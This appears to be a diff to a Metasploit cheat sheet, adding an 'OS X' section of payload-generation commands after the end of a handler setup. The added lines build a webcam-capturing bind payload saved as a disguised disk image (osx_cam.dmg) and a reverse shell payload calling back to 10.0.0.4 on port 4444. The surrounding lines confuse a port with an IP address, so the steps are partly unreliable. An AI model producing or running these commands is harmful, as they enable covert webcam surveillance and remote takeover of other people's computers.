@@ -8,3 +8,12 @@
 6- set LHOST <REMOTE_IP>
 7- set LPORT <LOCAL_IP>
 8- exploit
+
+
+
+=======
+ OS X
+=======
+
+- ./msfpayload osx/x86/isight/bind_tcp X> osx_cam.dmg
+- ./msfpayload osx/ppc/shell_reverse_tcp LHOST=10.0.0.4 LPORT=4444 > osx_payload_ppc
